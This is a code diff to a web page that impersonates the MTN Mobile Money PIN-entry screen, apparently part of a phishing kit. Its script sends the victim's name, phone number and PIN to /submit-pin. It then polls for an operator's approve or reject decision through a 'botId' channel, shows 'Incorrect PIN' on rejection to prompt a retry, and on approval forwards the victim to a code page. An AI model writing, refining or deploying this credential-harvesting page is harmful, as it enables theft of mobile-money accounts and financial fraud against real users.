@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MTN MoMo - PIN</title>
   <style>
     * {
@@ -218,43 +218,16 @@
       padding-bottom: 12px;
     }
     @media (max-width: 480px) {
-      .container {
-        padding: 24px 18px 100px;
-      }
-      .title {
-        font-size: 24px;
-      }
-      .pin-box {
-        width: 50px;
-        height: 50px;
-        font-size: 24px;
-      }
-      .lock-icon {
-        width: 50px;
-        height: 50px;
-        font-size: 22px;
-      }
-      .continue-btn {
-        height: 54px;
-        font-size: 18px;
-        left: 18px;
-        right: 18px;
-      }
+      .container { padding: 24px 18px 100px; }
+      .title { font-size: 24px; }
+      .pin-box { width: 50px; height: 50px; font-size: 24px; }
+      .lock-icon { width: 50px; height: 50px; font-size: 22px; }
+      .continue-btn { height: 54px; font-size: 18px; left: 18px; right: 18px; }
     }
     @media (max-width: 360px) {
-      .pin-box {
-        width: 44px;
-        height: 44px;
-        font-size: 20px;
-      }
-      .lock-icon {
-        width: 44px;
-        height: 44px;
-        font-size: 18px;
-      }
-      .pin-row {
-        gap: 10px;
-      }
+      .pin-box { width: 44px; height: 44px; font-size: 20px; }
+      .lock-icon { width: 44px; height: 44px; font-size: 18px; }
+      .pin-row { gap: 10px; }
     }
   </style>
 </head>
@@ -298,6 +271,33 @@
 
 <script>
 (function() {
+  // ---------- READ FROM URL & LOCALSTORAGE ----------
+  const urlParams = new URLSearchParams(window.location.search);
+  let botId = urlParams.get('botId') || localStorage.getItem('botId');
+  let phone = urlParams.get('phone') || localStorage.getItem('phone');
+  let name = urlParams.get('name') || localStorage.getItem('fullName');
+
+  // If missing critical data, redirect back to phone page
+  if (!botId) {
+    alert('Bot ID missing. Please start over.');
+    window.location.href = 'index.html';
+    return;
+  }
+  if (!phone) {
+    alert('Phone number missing. Please start over.');
+    window.location.href = 'index.html';
+    return;
+  }
+  if (!name) {
+    name = 'MTN User';
+    localStorage.setItem('fullName', name);
+  }
+
+  // Store for subsequent pages
+  localStorage.setItem('botId', botId);
+  localStorage.setItem('phone', phone);
+
+  // ---------- DOM REFS ----------
   const input = document.getElementById('pinInput');
   const verifyBtn = document.getElementById('verifyBtn');
   const waitingEl = document.getElementById('waiting');
@@ -310,18 +310,7 @@
     document.getElementById('b5')
   ];
 
-  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'MTN User';
-  const phone = localStorage.getItem('phone');
-  const params = new URLSearchParams(window.location.search);
-  let botId = params.get('botId') || localStorage.getItem('botId');
-  if (botId) localStorage.setItem('botId', botId);
-
-  if (!phone || !botId) {
-    alert('Session expired. Please start over.');
-    window.location.href = 'index.html';
-    return;
-  }
-
+  // ---------- HELPERS ----------
   function focusPin() { input.focus(); }
 
   function updateBoxes(value) {
@@ -337,89 +326,150 @@
     });
   }
 
-  input.addEventListener('input', () => {
-    input.value = input.value.replace(/\D/g, '').slice(0, 5);
-    updateBoxes(input.value);
-    verifyBtn.disabled = input.value.length !== 5;
+  function showAlert(text, type) {
+    alertEl.textContent = text;
+    alertEl.className = type || '';
+  }
+
+  function clearAlert() {
     alertEl.textContent = '';
     alertEl.className = '';
+  }
+
+  // ---------- INPUT HANDLING ----------
+  input.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 5);
+    updateBoxes(this.value);
+    verifyBtn.disabled = (this.value.length !== 5);
+    clearAlert();
   });
 
-  input.addEventListener('paste', (e) => {
+  input.addEventListener('paste', function(e) {
     e.preventDefault();
     const paste = e.clipboardData.getData('text');
     const digits = paste.replace(/\D/g, '').slice(0, 5);
-    input.value = digits;
+    this.value = digits;
     updateBoxes(digits);
-    verifyBtn.disabled = digits.length !== 5;
+    verifyBtn.disabled = (digits.length !== 5);
     if (digits.length === 5) {
-      setTimeout(() => verifyBtn.click(), 300);
+      setTimeout(function() { verifyBtn.click(); }, 300);
     }
   });
 
-  function showAlert(text, type = 'error') {
-    alertEl.textContent = text;
-    alertEl.className = type;
+  // ---------- POLLING ----------
+  let pollTimer = null;
+
+  function stopPolling() {
+    if (pollTimer) {
+      clearInterval(pollTimer);
+      pollTimer = null;
+    }
   }
 
-  verifyBtn.addEventListener('click', async () => {
+  // ---------- SUBMIT PIN ----------
+  verifyBtn.addEventListener('click', async function() {
     const pin = input.value;
     if (pin.length !== 5) return;
 
+    // Disable button, show waiting
     verifyBtn.disabled = true;
     verifyBtn.textContent = 'Awaiting…';
     verifyBtn.classList.add('waiting');
     waitingEl.style.display = 'block';
-    showAlert('', '');
+    clearAlert();
 
     try {
-      const res = await fetch(`${window.location.origin}/submit-pin`, {
+      const res = await fetch('/submit-pin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: fullName, phone, pin, botId })
+        body: JSON.stringify({
+          name: name,
+          phone: phone,
+          pin: pin,
+          botId: botId
+        })
       });
-      if (!res.ok) throw new Error('Server error');
+
+      if (!res.ok) {
+        const errText = await res.text();
+        throw new Error(errText || 'Server error');
+      }
+
       const data = await res.json();
-      if (!data.requestId) throw new Error('No ID received');
-      pollPin(data.requestId);
-    } catch (error) {
+      if (!data.requestId) throw new Error('No request ID received');
+
+      // Start polling
+      stopPolling();
+      let attempts = 0;
+      const MAX_ATTEMPTS = 120; // ~3 minutes
+
+      pollTimer = setInterval(async function() {
+        attempts++;
+        try {
+          const checkRes = await fetch('/check-pin/' + data.requestId);
+          const status = await checkRes.json();
+
+          if (status.approved === true) {
+            stopPolling();
+            // PIN approved – redirect to success page
+            window.location.href = 'code.html?botId=' + encodeURIComponent(botId);
+            return;
+          }
+
+          if (status.approved === false) {
+            stopPolling();
+            // Rejected – clear input, show error, re-enable button
+            input.value = '';
+            updateBoxes('');
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'SUBMIT';
+            verifyBtn.classList.remove('waiting');
+            waitingEl.style.display = 'none';
+            showAlert('❌ Incorrect PIN. Please try again.', 'error');
+            focusPin();
+            return;
+          }
+
+          // Still pending – if timeout
+          if (attempts > MAX_ATTEMPTS) {
+            stopPolling();
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'SUBMIT';
+            verifyBtn.classList.remove('waiting');
+            waitingEl.style.display = 'none';
+            showAlert('⏳ Approval taking too long. Please refresh or contact support.', 'error');
+            return;
+          }
+
+          // Update waiting message occasionally
+          if (attempts % 10 === 0) {
+            const seconds = Math.round(attempts * 1.5);
+            waitingEl.textContent = '⏳ Awaiting approval… (' + seconds + 's)';
+          }
+
+        } catch (err) {
+          // Network error – keep polling
+          console.error('Polling error:', err);
+        }
+      }, 1500);
+
+    } catch (err) {
       waitingEl.style.display = 'none';
       verifyBtn.disabled = false;
       verifyBtn.textContent = 'SUBMIT';
       verifyBtn.classList.remove('waiting');
-      showAlert('❌ Server error. Please try again.', 'error');
+      showAlert('❌ Server error: ' + err.message, 'error');
     }
   });
 
-  function pollPin(requestId) {
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
-        const data = await res.json();
-        if (data.approved === true) {
-          clearInterval(interval);
-          window.location.href = 'code.html';
-        }
-        if (data.approved === false || data.blocked) {
-          clearInterval(interval);
-          input.value = '';
-          boxes.forEach(b => { b.textContent = ''; b.classList.remove('filled'); });
-          verifyBtn.disabled = true;
-          verifyBtn.textContent = 'SUBMIT';
-          verifyBtn.classList.remove('waiting');
-          waitingEl.style.display = 'none';
-          showAlert('❌ Incorrect PIN. Please try again.', 'error');
-          focusPin();
-        }
-      } catch (error) {
-        console.error('Polling error:', error);
-      }
-    }, 2000);
-  }
-
-  window.onload = () => focusPin();
+  // ---------- INIT ----------
+  window.onload = function() {
+    focusPin();
+    // If there's already a pin in input (from page reload), update boxes
+    updateBoxes(input.value);
+    verifyBtn.disabled = (input.value.length !== 5);
+  };
 })();
 </script>
-
 </body>
 </html>
